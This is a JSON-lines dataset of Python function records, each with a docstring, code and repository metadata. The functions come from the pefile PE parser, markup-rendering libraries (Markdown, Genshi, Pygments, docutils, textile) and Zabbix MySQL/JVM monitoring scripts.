{"docstring": "\"\"\"Check whether the section contains the file offset provided.\"\"\"\n\n", "func_signal": "def contains_offset(self, offset):\n", "code": "if self.PointerToRawData is None:\n   # bss and other sections containing only uninitialized data must have 0\n   # and do not take space in the file\n   return False\nreturn ( self.pe.adjust_FileAlignment( self.PointerToRawData, \n        self.pe.OPTIONAL_HEADER.FileAlignment ) <= \n            offset < \n                self.pe.adjust_FileAlignment( self.PointerToRawData,\n                    self.pe.OPTIONAL_HEADER.FileAlignment ) + \n                        self.SizeOfRawData )", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Return the word value at the given file offset. (little endian)\"\"\"\n\n", "func_signal": "def get_word_from_offset(self, offset):\n", "code": "if offset+2 > len(self.__data__):\n    return None\n\nreturn self.get_word_from_data(self.__data__[offset:offset+2], 0)", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"\"\"\"\n\n", "func_signal": "def parse_directory_bound_imports(self, rva, size):\n", "code": "bnd_descr = Structure(self.__IMAGE_BOUND_IMPORT_DESCRIPTOR_format__)\nbnd_descr_size = bnd_descr.sizeof()\nstart = rva\n\nbound_imports = []\nwhile True:\n    \n    bnd_descr = self.__unpack_data__(\n        self.__IMAGE_BOUND_IMPORT_DESCRIPTOR_format__,\n           self.__data__[rva:rva+bnd_descr_size],\n           file_offset = rva)\n    if bnd_descr is None:\n        # If can't parse directory then silently return.\n        # This directory does not necessarily have to be valid to\n        # still have a valid PE file\n        \n        self.__warnings.append(\n            'The Bound Imports directory exists but can\\'t be parsed.')\n        \n        return\n    \n    if bnd_descr.all_zeroes():\n        break\n    \n    rva += bnd_descr.sizeof()\n    \n    forwarder_refs = []\n    for idx in xrange(bnd_descr.NumberOfModuleForwarderRefs):\n        # Both structures IMAGE_BOUND_IMPORT_DESCRIPTOR and\n        # IMAGE_BOUND_FORWARDER_REF have the same size.\n        bnd_frwd_ref = self.__unpack_data__(\n            self.__IMAGE_BOUND_FORWARDER_REF_format__,\n            self.__data__[rva:rva+bnd_descr_size],\n            file_offset = rva)\n        # OC Patch:\n        if not bnd_frwd_ref:\n            raise PEFormatError(\n                \"IMAGE_BOUND_FORWARDER_REF cannot be read\")\n        rva += bnd_frwd_ref.sizeof()\n        \n        offset = start+bnd_frwd_ref.OffsetModuleName\n        name_str =  self.get_string_from_data(\n            0, self.__data__[offset : offset + MAX_STRING_LENGTH])\n        \n        if not name_str:\n            break\n        forwarder_refs.append(BoundImportRefData(\n            struct = bnd_frwd_ref,\n            name = name_str))\n            \n    offset = start+bnd_descr.OffsetModuleName\n    name_str = self.get_string_from_data(\n        0, self.__data__[offset : offset + MAX_STRING_LENGTH])\n    \n    if not name_str:\n        break\n    bound_imports.append(\n        BoundImportDescData(\n            struct = bnd_descr,\n            name = name_str,\n            entries = forwarder_refs))\n\nreturn bound_imports", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Gets the physical address in the PE file from an RVA value.\"\"\"\n", "func_signal": "def get_physical_by_rva(self, rva):\n", "code": "try:\n    return self.get_offset_from_rva(rva)\nexcept Exception:\n    return None", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Get the MD5 hex-digest of the section's data.\"\"\"\n\n", "func_signal": "def get_hash_md5(self):\n", "code": "if md5 is not None:\n    return md5( self.get_data() ).hexdigest()", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Parses the rich header\nsee http://www.ntcore.com/files/richsign.htm for more information\n\nStructure:\n00 DanS ^ checksum, checksum, checksum, checksum\n10 Symbol RVA ^ checksum, Symbol size ^ checksum...\n...\nXX Rich, checksum, 0, 0,...\n\"\"\"\n\n# Rich Header constants\n#\n", "func_signal": "def parse_rich_header(self):\n", "code": "DANS = 0x536E6144 # 'DanS' as dword\nRICH = 0x68636952 # 'Rich' as dword\n\n# Read a block of data\n#\ntry:\n    data = list(struct.unpack(\"<32I\", self.get_data(0x80, 0x80)))\nexcept:\n    # In the cases where there's not enough data to contain the Rich header\n    # we abort its parsing\n    return None\n\n# the checksum should be present 3 times after the DanS signature\n#\nchecksum = data[1]\nif (data[0] ^ checksum != DANS\n    or data[2] != checksum\n    or data[3] != checksum):\n    return None\n\nresult = {\"checksum\": checksum}\nheadervalues = []\nresult [\"values\"] = headervalues\n\ndata = data[4:] \nfor i in xrange(len(data) / 2):\n    \n    # Stop until the Rich footer signature is found\n    #\n    if data[2 * i] == RICH:\n        \n        # it should be followed by the checksum\n        #\n        if data[2 * i + 1] != checksum:\n            self.__warnings.append('Rich Header corrupted')\n        break\n    \n    # header values come by pairs\n    #\n    headervalues += [data[2 * i] ^ checksum, data[2 * i + 1] ^ checksum]\nreturn result", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Update the PE image content with any individual section data that has been modified.\"\"\"\n\n", "func_signal": "def merge_modified_section_data(self):\n", "code": "for section in self.sections:\n    section_data_start = self.adjust_FileAlignment( section.PointerToRawData,\n        self.OPTIONAL_HEADER.FileAlignment )\n    section_data_end = section_data_start+section.SizeOfRawData\n    if section_data_start < len(self.__data__) and section_data_end < len(self.__data__):\n        self.__data__ = self.__data__[:section_data_start] + section.get_data() + self.__data__[section_data_end:]", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Convert two bytes of data to a word (little endian)\n\n'offset' is assumed to index into a word array. So setting it to\nN will return a dword out of the data starting at offset N*2.\n\nReturns None if the data can't be turned into a word.\n\"\"\"\n\n", "func_signal": "def get_word_from_data(self, data, offset):\n", "code": "if (offset+1)*2 > len(data):\n    return None\n\nreturn struct.unpack('<H', data[offset*2:(offset+1)*2])[0]", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Get the data appended to the file and not contained within the area described in the headers.\"\"\"\n\n", "func_signal": "def get_overlay(self):\n", "code": "overlay_data_offset = self.get_overlay_data_start_offset()\n        \nif overlay_data_offset is not None:\n    return self.__data__[ overlay_data_offset : ]\n    \nreturn None", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"The next RVA is taken to be the one immediately following this one.\n\nSuch RVA could indicate the natural end of the string and will be checked\nwith the possible length contained in the first word.\n\"\"\"\n\n", "func_signal": "def ask_pascal_16(self, next_rva_ptr):\n", "code": "length = self.__get_pascal_16_length()\n\nif length == (next_rva_ptr - (self.rva_ptr+2)) / 2:\n    self.length = length\n    return True\n\nreturn False", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Returns a list of all the strings found withing the resources (if any).\n\nThis method will scan all entries in the resources directory of the PE, if\nthere is one, and will return a list() with the strings.\n\nAn empty list will be returned otherwise.\n\"\"\"\n\n", "func_signal": "def get_resources_strings(self):\n", "code": "resources_strings = list()\n\nif hasattr(self, 'DIRECTORY_ENTRY_RESOURCE'):\n    \n    for resource_type in self.DIRECTORY_ENTRY_RESOURCE.entries:\n        if hasattr(resource_type, 'directory'):\n            for resource_id in resource_type.directory.entries:\n                if hasattr(resource_id, 'directory'):\n                    if hasattr(resource_id.directory, 'strings') and resource_id.directory.strings:\n                        for res_string in resource_id.directory.strings.values():\n                            resources_strings.append( res_string )\n                            \nreturn resources_strings", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Check whether the file is a standard DLL.\n\nThis will return true only if the image has the IMAGE_FILE_DLL flag set.\n\"\"\"\n\n", "func_signal": "def is_dll(self):\n", "code": "DLL_flag = IMAGE_CHARACTERISTICS['IMAGE_FILE_DLL']\n\nif ( DLL_flag & self.FILE_HEADER.Characteristics) == DLL_flag:\n    return True\n    \nreturn False", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Check whether the file is a standard executable.\n\nThis will return true only if the file has the IMAGE_FILE_EXECUTABLE_IMAGE flag set\nand the IMAGE_FILE_DLL not set and the file does not appear to be a driver either.\n\"\"\"\n\n", "func_signal": "def is_exe(self):\n", "code": "EXE_flag = IMAGE_CHARACTERISTICS['IMAGE_FILE_EXECUTABLE_IMAGE']\n\nif (not self.is_dll()) and (not self.is_driver()) and ( \n        EXE_flag & self.FILE_HEADER.Characteristics) == EXE_flag:\n    return True\n\nreturn False", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Convert four bytes of data to a double word (little endian)\n\n'offset' is assumed to index into a dword array. So setting it to\nN will return a dword out of the data starting at offset N*4.\n\nReturns None if the data can't be turned into a double word.\n\"\"\"\n\n", "func_signal": "def get_dword_from_data(self, data, offset):\n", "code": "if (offset+1)*4 > len(data):\n    return None\n\nreturn struct.unpack('<I', data[offset*4:(offset+1)*4])[0]", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Support our syntax for emphasizing certain lines of code.\n\nexpr should be like '1 2' to emphasize lines 1 and 2 of a code block.\nReturns a list of ints, the line numbers to emphasize.\n\"\"\"\n", "func_signal": "def parse_hl_lines(expr):\n", "code": "if not expr:\n    return []\n\ntry:\n    return list(map(int, expr.split()))\nexcept ValueError:\n    return []", "path": "OmniMarkupLib\\Renderers\\libs\\markdown\\extensions\\codehilite.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "# If the name refers to a local inside a lambda, list comprehension, or\n# generator expression, leave it alone\n", "func_signal": "def visit_Name(self, node):\n", "code": "if isinstance(node.ctx, _ast.Load) and \\\n        node.id not in flatten(self.locals):\n    # Otherwise, translate the name ref into a context lookup\n    name = _new(_ast.Name, '_lookup_name', _ast.Load())\n    namearg = _new(_ast.Name, '__data__', _ast.Load())\n    strarg = _new(_ast.Str, node.id)\n    node = _new(_ast.Call, name, [namearg, strarg], [])\nelif isinstance(node.ctx, _ast.Store):\n    if len(self.locals) > 1:\n        self.locals[-1].add(node.id)\n\nreturn node", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "# TODO: add support for background colors\n", "func_signal": "def format_unencoded(self, tokensource, outfile):\n", "code": "t2n = self.ttype2name\ncp = self.commandprefix\n\nif self.full:\n    realoutfile = outfile\n    outfile = StringIO()\n\noutfile.write(u'\\\\begin{' + self.envname + u'}[commandchars=\\\\\\\\\\\\{\\\\}')\nif self.linenos:\n    start, step = self.linenostart, self.linenostep\n    outfile.write(u',numbers=left' +\n                  (start and u',firstnumber=%d' % start or u'') +\n                  (step and u',stepnumber=%d' % step or u''))\nif self.mathescape or self.texcomments or self.escapeinside:\n    outfile.write(u',codes={\\\\catcode`\\\\$=3\\\\catcode`\\\\^=7\\\\catcode`\\\\_=8}')\nif self.verboptions:\n    outfile.write(u',' + self.verboptions)\noutfile.write(u']\\n')\n\nfor ttype, value in tokensource:\n    if ttype in Token.Comment:\n        if self.texcomments:\n            # Try to guess comment starting lexeme and escape it ...\n            start = value[0:1]\n            for i in xrange(1, len(value)):\n                if start[0] != value[i]:\n                    break\n                start += value[i]\n\n            value = value[len(start):]\n            start = escape_tex(start, self.commandprefix)\n\n            # ... but do not escape inside comment.\n            value = start + value\n        elif self.mathescape:\n            # Only escape parts not inside a math environment.\n            parts = value.split('$')\n            in_math = False\n            for i, part in enumerate(parts):\n                if not in_math:\n                    parts[i] = escape_tex(part, self.commandprefix)\n                in_math = not in_math\n            value = '$'.join(parts)\n        elif self.escapeinside:\n            text = value\n            value = ''\n            while len(text) > 0:\n                a, sep1, text = text.partition(self.left)\n                if len(sep1) > 0:\n                    b, sep2, text = text.partition(self.right)\n                    if len(sep2) > 0:\n                        value += escape_tex(a, self.commandprefix) + b\n                    else:\n                        value += escape_tex(a + sep1 + b, self.commandprefix)\n                else:\n                    value = value + escape_tex(a, self.commandprefix)\n        else:\n            value = escape_tex(value, self.commandprefix)\n    elif ttype not in Token.Escape:\n        value = escape_tex(value, self.commandprefix)\n    styles = []\n    while ttype is not Token:\n        try:\n            styles.append(t2n[ttype])\n        except KeyError:\n            # not in current style\n            styles.append(_get_ttype_name(ttype))\n        ttype = ttype.parent\n    styleval = '+'.join(reversed(styles))\n    if styleval:\n        spl = value.split('\\n')\n        for line in spl[:-1]:\n            if line:\n                outfile.write(\"\\\\%s{%s}{%s}\" % (cp, styleval, line))\n            outfile.write('\\n')\n        if spl[-1]:\n            outfile.write(\"\\\\%s{%s}{%s}\" % (cp, styleval, spl[-1]))\n    else:\n        outfile.write(value)\n\noutfile.write(u'\\\\end{' + self.envname + u'}\\n')\n\nif self.full:\n    realoutfile.write(DOC_TEMPLATE %\n        dict(docclass  = self.docclass,\n             preamble  = self.preamble,\n             title     = self.title,\n             encoding  = self.encoding or 'utf8',\n             styledefs = self.get_style_defs(),\n             code      = outfile.getvalue()))", "path": "OmniMarkupLib\\Renderers\\libs\\pygments\\formatters\\latex.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"\nDetermines language of a code block from shebang line and whether said\nline should be removed or left in place. If the sheband line contains a\npath (even a single /) then it is assumed to be a real shebang line and\nleft alone. However, if no path is given (e.i.: #!python or :::python)\nthen it is assumed to be a mock shebang for language identifitation of a\ncode fragment and removed from the code block prior to processing for\ncode highlighting. When a mock shebang (e.i: #!python) is found, line\nnumbering is turned on. When colons are found in place of a shebang\n(e.i.: :::python), line numbering is left in the current state - off\nby default.\n\nAlso parses optional list of highlight lines, like:\n\n    :::python hl_lines=\"1 3\"\n\"\"\"\n\n", "func_signal": "def _parseHeader(self):\n", "code": "import re\n\n#split text into lines\nlines = self.src.split(\"\\n\")\n#pull first line to examine\nfl = lines.pop(0)\n\nc = re.compile(r'''\n    (?:(?:^::+)|(?P<shebang>^[#]!)) # Shebang or 2 or more colons\n    (?P<path>(?:/\\w+)*[/ ])?        # Zero or 1 path\n    (?P<lang>[\\w+-]*)               # The language\n    \\s*                             # Arbitrary whitespace\n    # Optional highlight lines, single- or double-quote-delimited\n    (hl_lines=(?P<quot>\"|')(?P<hl_lines>.*?)(?P=quot))?\n    ''',  re.VERBOSE)\n# search first line for shebang\nm = c.search(fl)\nif m:\n    # we have a match\n    try:\n        self.lang = m.group('lang').lower()\n    except IndexError:\n        self.lang = None\n    if m.group('path'):\n        # path exists - restore first line\n        lines.insert(0, fl)\n    if self.linenums is None and m.group('shebang'):\n        # Overridable and Shebang exists - use line numbers\n        self.linenums = True\n\n    self.hl_lines = parse_hl_lines(m.group('hl_lines'))\nelse:\n    # No match\n    lines.insert(0, fl)\n\nself.src = \"\\n\".join(lines).strip(\"\\n\")", "path": "OmniMarkupLib\\Renderers\\libs\\markdown\\extensions\\codehilite.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"This function is used as helper if a Python version with a broken\nstar-import opcode is in use.\n\"\"\"\n", "func_signal": "def _star_import_patch(mapping, modname):\n", "code": "module = __import__(modname, None, None, ['__all__'])\nif hasattr(module, '__all__'):\n    members = module.__all__\nelse:\n    members = [x for x in module.__dict__ if not x.startswith('_')]\nmapping.update([(name, getattr(module, name)) for name in members])", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"\nReturn the command sequences needed to define the commands\nused to format text in the verbatim environment. ``arg`` is ignored.\n\"\"\"\n", "func_signal": "def get_style_defs(self, arg=''):\n", "code": "cp = self.commandprefix\nstyles = []\nfor name, definition in iteritems(self.cmd2def):\n    styles.append(r'\\expandafter\\def\\csname %s@tok@%s\\endcsname{%s}' %\n                  (cp, name, definition))\nreturn STYLE_TEMPLATE % {'cp': self.commandprefix,\n                         'styles': '\\n'.join(styles)}", "path": "OmniMarkupLib\\Renderers\\libs\\pygments\\formatters\\latex.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "# XHTML\n", "func_signal": "def testKnownValuesXHTML(self):\n", "code": "for t, h in self.xhtml_known_values:\n    yield self.check_textile, t, h, 'xhtml'", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\textile\\tests\\__init__.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\" Find code blocks and store in htmlStash. \"\"\"\n", "func_signal": "def run(self, root):\n", "code": "blocks = root.getiterator('pre')\nfor block in blocks:\n    children = block.getchildren()\n    if len(children) == 1 and children[0].tag == 'code':\n        code = CodeHilite(children[0].text,\n                    linenums=self.config['linenums'],\n                    guess_lang=self.config['guess_lang'],\n                    css_class=self.config['css_class'],\n                    style=self.config['pygments_style'],\n                    noclasses=self.config['noclasses'],\n                    tab_length=self.markdown.tab_length)\n        placeholder = self.markdown.htmlStash.store(code.hilite(),\n                                                    safe=True)\n        # Clear codeblock in etree instance\n        block.clear()\n        # Change to p element which will later\n        # be removed when inserting raw html\n        block.tag = 'p'\n        block.text = placeholder", "path": "OmniMarkupLib\\Renderers\\libs\\markdown\\extensions\\codehilite.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Construct the globals dictionary to use as the execution context for\nthe expression or suite.\n\"\"\"\n", "func_signal": "def globals(cls, data):\n", "code": "return {\n    '__data__': data,\n    '_lookup_name': cls.lookup_name,\n    '_lookup_attr': cls.lookup_attr,\n    '_lookup_item': cls.lookup_item,\n    '_star_import_patch': _star_import_patch,\n    'UndefinedError': UndefinedError,\n}", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Return a copy of a title, with references, images, etc. removed.\"\"\"\n", "func_signal": "def copy_and_filter(self, node):\n", "code": "visitor = ContentsFilter(self.document)\nnode.walkabout(visitor)\nreturn visitor.get_entry_text()", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\docutils\\transforms\\parts.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"\nPass code to the [Pygments](http://pygments.pocoo.org/) highliter with\noptional line numbers. The output should then be styled with css to\nyour liking. No styles are applied by default - only styling hooks\n(i.e.: <span class=\"k\">).\n\nreturns : A string of html.\n\n\"\"\"\n\n", "func_signal": "def hilite(self):\n", "code": "self.src = self.src.strip('\\n')\n\nif self.lang is None:\n    self._parseHeader()\n\nif pygments:\n    try:\n        lexer = get_lexer_by_name(self.lang)\n    except ValueError:\n        try:\n            if self.guess_lang:\n                lexer = guess_lexer(self.src)\n            else:\n                lexer = TextLexer()\n        except ValueError:\n            lexer = TextLexer()\n    formatter = HtmlFormatter(linenos=self.linenums,\n                              cssclass=self.css_class,\n                              style=self.style,\n                              noclasses=self.noclasses,\n                              hl_lines=self.hl_lines)\n    return highlight(self.src, lexer, formatter)\nelse:\n    # just escape and build markup usable by JS highlighting libs\n    txt = self.src.replace('&', '&amp;')\n    txt = txt.replace('<', '&lt;')\n    txt = txt.replace('>', '&gt;')\n    txt = txt.replace('\"', '&quot;')\n    classes = []\n    if self.lang:\n        classes.append('language-%s' % self.lang)\n    if self.linenums:\n        classes.append('linenums')\n    class_str = ''\n    if classes:\n        class_str = ' class=\"%s\"' % ' '.join(classes) \n    return '<pre class=\"%s\"><code%s>%s</code></pre>\\n'% \\\n                (self.css_class, class_str, txt)", "path": "OmniMarkupLib\\Renderers\\libs\\markdown\\extensions\\codehilite.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Return an ``Undefined`` object.\"\"\"\n", "func_signal": "def undefined(cls, key, owner=UNDEFINED):\n", "code": "__traceback_hide__ = True\nreturn Undefined(key, owner=owner)", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Return a copy of the given text with any character or numeric entities\nreplaced by the equivalent UTF-8 characters.\n\n>>> stripentities('1 &lt; 2')\n'1 < 2'\n>>> stripentities('more &hellip;')\n'more \\u2026'\n>>> stripentities('&#8230;')\n'\\u2026'\n>>> stripentities('&#x2026;')\n'\\u2026'\n\nIf the `keepxmlentities` parameter is provided and is a truth value, the\ncore XML entities (&amp;, &apos;, &gt;, &lt; and &quot;) are left intact.\n\n>>> stripentities('1 &lt; 2 &hellip;', keepxmlentities=True)\n'1 &lt; 2 \\u2026'\n\"\"\"\n", "func_signal": "def stripentities(text, keepxmlentities=False):\n", "code": "def _replace_entity(match):\n    if match.group(1): # numeric entity\n        ref = match.group(1)\n        if ref.startswith('x'):\n            ref = int(ref[1:], 16)\n        else:\n            ref = int(ref, 10)\n        return chr(ref)\n    else: # character entity\n        ref = match.group(2)\n        if keepxmlentities and ref in ('amp', 'apos', 'gt', 'lt', 'quot'):\n            return '&%s;' % ref\n        try:\n            return chr(entities.name2codepoint[ref])\n        except KeyError:\n            if keepxmlentities:\n                return '&amp;%s;' % ref\n            else:\n                return ref\nreturn _STRIPENTITIES_RE.sub(_replace_entity, text)", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\util.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Raise an ``UndefinedError`` immediately.\"\"\"\n", "func_signal": "def undefined(cls, key, owner=UNDEFINED):\n", "code": "__traceback_hide__ = True\nraise UndefinedError(key, owner=owner)", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Raise an `UndefinedError`.\"\"\"\n", "func_signal": "def _die(self, *args, **kwargs):\n", "code": "__traceback_hide__ = True\nraise UndefinedError(self._name, self._owner)", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "# HTML4\n", "func_signal": "def testKnownValuesHTML(self):\n", "code": "for t, h in self.html_known_values:\n    yield self.check_textile, t, h, 'html'", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\textile\\tests\\__init__.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Initialize the object.\n\n:param name: the name of the reference\n:param owner: the owning object, if the variable is accessed as a member\n\"\"\"\n", "func_signal": "def __init__(self, name, owner=UNDEFINED):\n", "code": "self._name = name\nself._owner = owner", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Execute the suite in the given data dictionary.\n\n:param data: a mapping containing the data to execute in\n\"\"\"\n", "func_signal": "def execute(self, data):\n", "code": "__traceback_hide__ = 'before_and_this'\n_globals = self._globals(data)\nexec(self.code, _globals, data)", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\template\\eval.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"Flattens a potentially nested sequence into a flat list.\n\n:param items: the sequence to flatten\n\n>>> flatten((1, 2))\n[1, 2]\n>>> flatten([1, (2, 3), 4])\n[1, 2, 3, 4]\n>>> flatten([1, (2, [3, 4]), 5])\n[1, 2, 3, 4, 5]\n\"\"\"\n", "func_signal": "def flatten(items):\n", "code": "retval = []\nfor item in items:\n    if isinstance(item, (frozenset, list, set, tuple)):\n        retval += flatten(item)\n    else:\n        retval.append(item)\nreturn retval", "path": "OmniMarkupLib\\Renderers\\libs\\python3\\genshi\\util.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "# define default configs\n", "func_signal": "def __init__(self, configs):\n", "code": "self.config = {\n    'linenums': [None, \"Use lines numbers. True=yes, False=no, None=auto\"],\n    'force_linenos' : [False, \"Depreciated! Use 'linenums' instead. Force line numbers - Default: False\"],\n    'guess_lang' : [True, \"Automatic language detection - Default: True\"],\n    'css_class' : [\"codehilite\",\n                   \"Set class name for wrapper <div> - Default: codehilite\"],\n    'pygments_style' : ['default', 'Pygments HTML Formatter Style (Colorscheme) - Default: default'],\n    'noclasses': [False, 'Use inline styles instead of CSS classes - Default false']\n    }\n\n# Override defaults with user settings\nfor key, value in configs:\n    # convert strings to booleans\n    if value == 'True': value = True\n    if value == 'False': value = False\n    if value == 'None': value = None\n\n    if key == 'force_linenos':\n        warnings.warn('The \"force_linenos\" config setting'\n            ' to the CodeHilite extension is deprecrecated.'\n            ' Use \"linenums\" instead.', DeprecationWarning)\n        if value:\n            # Carry 'force_linenos' over to new 'linenos'.\n            self.setConfig('linenums', True)\n\n    self.setConfig(key, value)", "path": "OmniMarkupLib\\Renderers\\libs\\markdown\\extensions\\codehilite.py", "repo_name": "timonwong/OmniMarkupPreviewer", "stars": 498, "license": "mit", "language": "python", "size": 6938}
{"docstring": "\"\"\"\nQuery Cache\u547d\u4e2d\u7387\n\"\"\"\n", "func_signal": "def get_query_hit_rate(self):\n", "code": "Qcache_hits = self.get_item_tval(\"Qcache_hits\")\nQcache_inserts = self.get_item_tval( \"Qcache_inserts\")\n\ntotal = int(Qcache_hits) + int(Qcache_inserts)\nif total == 0:\n    return 100.0\n\nhitrate = \"%.2f\" % (Qcache_hits/float(total)*100)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\njava -jar cmdline-jmxclient-0.10.3.jar - localhost:12345 java.lang:type=Memory NonHeapMemoryUsage\n\u53c2\u6570\uff1a\n\"\"\"\n", "func_signal": "def get_item(self, beanstr, key, port):\n", "code": "pre_key = key\nsub_key = None\nif \".\" in key:\n    pos = str(key).rfind(\".\")\n    pre_key = key[0:pos]\n    sub_key = key[pos + 1:]\ncmdstr = \"%s -jar %s - localhost:%s '%s' '%s'\" % (self._java_path, self._cmdclient_jar, port, beanstr, pre_key)\n(stdo_list, stde_list, retcode) = docmd(cmdstr, timeout=3, raw=False)\n\nlog_da = [{\"beanstr\": beanstr},{\"key\": key}, {\"cmdstr\": cmdstr}, {\"ret\": retcode}, {\"stdo\": \"\".join(stdo_list)}, {\"stde\": \"\".join(stde_list)}]\nlogstr = get_logstr(log_da, max_key_len=10)\n\nif retcode != 0:\n    self._logger.error(logstr)\n    return None\nelse:\n    self._logger.info(logstr)\n\nif stde_list:\n    stdo_list.extend(stde_list)\n    \n# # without sub attr\nif not sub_key and stdo_list:\n    line = stdo_list[-1]\n    ln_ary = re.split(\" \", line)\n    if ln_ary and len(ln_ary) >= 2:\n        if pre_key in ln_ary[-2]:\n            return ln_ary[-1]\n    \n# print stdo_list,\"###\"\n# # with sub attr\nfor line in stdo_list:\n    line = str(line).strip()\n    ln_ary = re.split(\":\", line)\n    if ln_ary and len(ln_ary) != 2:continue\n    dst_key = str(ln_ary[0]).strip()\n    dst_val = str(ln_ary[1]).strip()\n    if sub_key == dst_key:\n        return dst_val\nreturn None", "path": "Tomcat\\jvm.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\u5224\u65ad\u4e00\u4e2aunicode\u662f\u5426\u662f\u6c49\u5b57\"\"\"\n", "func_signal": "def _is_chinese(self, uchar):\n", "code": "if uchar >= u'\\u4e00' and uchar <= u'\\u9fa5':\n    return True\nelse:\n    return False", "path": "Memcache\\qiueer\\python\\slog.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
